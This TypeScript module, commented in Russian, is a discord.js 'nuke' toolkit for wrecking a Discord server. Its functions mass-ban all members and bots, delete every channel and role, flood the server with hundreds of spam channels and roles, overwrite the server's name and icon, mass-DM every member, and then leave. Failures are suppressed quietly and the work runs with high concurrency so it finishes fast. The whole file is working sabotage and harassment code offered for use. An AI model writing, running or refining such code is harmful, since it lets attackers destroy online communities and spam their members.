import { Guild, TextChannel } from 'discord.js';

// Утилита ожидания (нужна только для повторных попыток при GatewayRateLimit)
const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Выполняет массив асинхронных задач с ограниченной конкурентностью.
 * При ошибках повторяет попытку до maxRetries раз.
 */
async function runWithConcurrency<T>(
  items: T[],
  handler: (item: T) => Promise<any>,
  concurrency: number,
  maxRetries: number = 3
): Promise<number> {
  let index = 0;
  let succeeded = 0;
  const workers: Promise<void>[] = [];

  const worker = async (): Promise<void> => {
    while (index < items.length) {
      const i = index++;
      let retries = 0;
      while (retries < maxRetries) {
        try {
          await handler(items[i]);
          succeeded++;
          break;
        } catch (err: any) {
          // При 429 или GatewayRateLimit просто повторяем – библиотека сама обработает задержку
          retries++;
          if (retries === maxRetries) break;
        }
      }
    }
  };

  for (let i = 0; i < concurrency; i++) {
    workers.push(worker());
  }
  await Promise.all(workers);
  return succeeded;
}

const EXCLUDED_BOT_IDS = new Set([
  '1094652205673492572',
  '1096945206449930322',
  '1094652205673492572'
]);

/** Банит всех ботов, кроме исключённых */
export async function banBots(guild: Guild, concurrency: number): Promise<number> {
  await guild.members.fetch();
  const bots = guild.members.cache.filter(
    m => m.user.bot && !EXCLUDED_BOT_IDS.has(m.id) && m.bannable
  );
  return runWithConcurrency([...bots.values()], async member => {
    await member.ban({ reason: 'Nuke' });
  }, concurrency);
}

/** Удаляет все каналы, которые можно удалить */
export async function deleteAllChannels(guild: Guild, concurrency: number): Promise<number> {
  const channels = await guild.channels.fetch();
  const deletable = [...channels.values()].filter(
    c => c && 'deletable' in c && c.deletable
  );
  return runWithConcurrency(deletable, async channel => {
    if (channel) await channel.delete();
  }, concurrency);
}

/** Создаёт голосовые каналы до лимита 200 */
export async function createVoiceChannels(
  guild: Guild,
  name: string,
  concurrency: number
): Promise<number> {
  const currentCount = guild.channels.cache.size;
  const toCreate = Math.max(0, 200 - currentCount);
  let created = 0;
  const promises: Promise<void>[] = [];
  for (let i = 0; i < toCreate; i++) {
    promises.push(
      (async () => {
        try {
          await guild.channels.create({ name: `${name}-${i}`, type: 2 });
          created++;
        } catch {}
      })()
    );
  }
  await Promise.all(promises);
  return created;
}

/**
 * Создаёт текстовые каналы, отправляет в каждый первое сообщение.
 * Возвращает массив созданных каналов для дальнейшего спама.
 */
export async function createTextChannels(
  guild: Guild,
  name: string,
  message: string,
  concurrency: number
): Promise<TextChannel[]> {
  const currentCount = guild.channels.cache.size;
  const toCreate = Math.max(0, 200 - currentCount);
  const createdChannels: TextChannel[] = [];
  const promises: Promise<void>[] = [];

  for (let i = 0; i < toCreate; i++) {
    promises.push(
      (async () => {
        try {
          const channel = await guild.channels.create({
            name: `${name}-${i}`,
            type: 0, // GUILD_TEXT
          });
          await (channel as TextChannel).send(message);
          createdChannels.push(channel as TextChannel);
        } catch {}
      })()
    );
  }

  await Promise.all(promises);
  return createdChannels;
}

/** Удаляет все редактируемые роли (кроме @everyone) */
export async function deleteAllRoles(guild: Guild, concurrency: number): Promise<number> {
  await guild.roles.fetch();
  const roles = guild.roles.cache.filter(r => r.editable && r.id !== guild.id);
  return runWithConcurrency([...roles.values()], async role => {
    await role.delete();
  }, concurrency);
}

/** Банит всех участников (кроме ботов) */
export async function banAllMembersBulk(guild: Guild, concurrency: number): Promise<number> {
  await guild.members.fetch();
  const members = guild.members.cache.filter(m => m.bannable && !m.user.bot);
  return runWithConcurrency([...members.values()], async member => {
    await member.ban({ reason: 'Nuke' });
  }, concurrency);
}

/** Создаёт роли до лимита 250 (Discord ограничивает 250 ролями) */
export async function createRoles(
  guild: Guild,
  name: string,
  concurrency: number
): Promise<number> {
  const currentCount = guild.roles.cache.size;
  const toCreate = Math.max(0, 250 - currentCount);
  let created = 0;
  const promises: Promise<void>[] = [];
  for (let i = 0; i < toCreate; i++) {
    promises.push(
      (async () => {
        try {
          await guild.roles.create({ name: `${name}-${i}` });
          created++;
        } catch {}
      })()
    );
  }
  await Promise.all(promises);
  return created;
}

/** Покидает гильдию */
export async function leaveGuild(guild: Guild): Promise<void> {
  try {
    await guild.leave();
  } catch {}
}

/**
 * Изменяет название и иконку сервера
 * @param guild - Сервер
 * @param name - Новое название (опционально)
 * @param iconUrl - URL иконки (опционально)
 */
export async function changeGuildAppearance(
  guild: Guild,
  name?: string,
  iconUrl?: string
): Promise<void> {
  try {
    const updates: any = {};
    if (name) updates.name = name;
    if (iconUrl) updates.icon = iconUrl;
    
    if (Object.keys(updates).length > 0) {
      await guild.edit(updates);
    }
  } catch (err: any) {
    // Игнорируем ошибки (нет прав и т.д.)
  }
}

/**
 * Отправляет сообщение в ЛС всем участникам сервера
 * @param guild - Сервер
 * @param message - Текст сообщения
 * @param delayMs - Задержка между сообщениями в мс (по умолчанию 1000)
 * @param concurrency - Количество параллельных отправок
 * @returns Количество успешно отправленных сообщений
 */
export async function dmAllMembers(
  guild: Guild,
  message: string,
  delayMs: number = 1000,
  concurrency: number = 5
): Promise<number> {
  // Пытаемся загрузить участников, но не ждём при рейт-лимите
  try {
    await guild.members.fetch();
  } catch (err: any) {
    // Если рейт-лимит - просто используем кэш
    console.log(`  Using cached members (${guild.members.cache.size} available)`);
  }

  const members = guild.members.cache.filter(m => !m.user.bot);
  let sent = 0;
  const memberArray = [...members.values()];

  if (memberArray.length === 0) {
    console.log(`  No members to DM (cache empty)`);
    return 0;
  }

  // Если задержка 0 - отправляем всё сразу блоками
  if (delayMs === 0) {
    const promises: Promise<void>[] = [];
    
    for (const member of memberArray) {
      promises.push(
        (async () => {
          try {
            await member.send(message);
            sent++;
          } catch (err: any) {
            // Игнорируем ошибки
          }
        })()
      );
    }
    
    await Promise.all(promises);
    return sent;
  }

  // Если есть задержка - используем воркеры с конкурентностью
  let index = 0;

  const worker = async (): Promise<void> => {
    while (index < memberArray.length) {
      const i = index++;
      const member = memberArray[i];
      
      try {
        await member.send(message);
        sent++;
        
        // Задержка между отправками
        if (delayMs > 0) {
          await sleep(delayMs);
        }
      } catch (err: any) {
        // Игнорируем ошибки (закрытые ЛС, заблокирован бот и т.д.)
      }
    }
  };

  const workers: Promise<void>[] = [];
  for (let i = 0; i < concurrency; i++) {
    workers.push(worker());
  }
  await Promise.all(workers);
  
  return sent;
}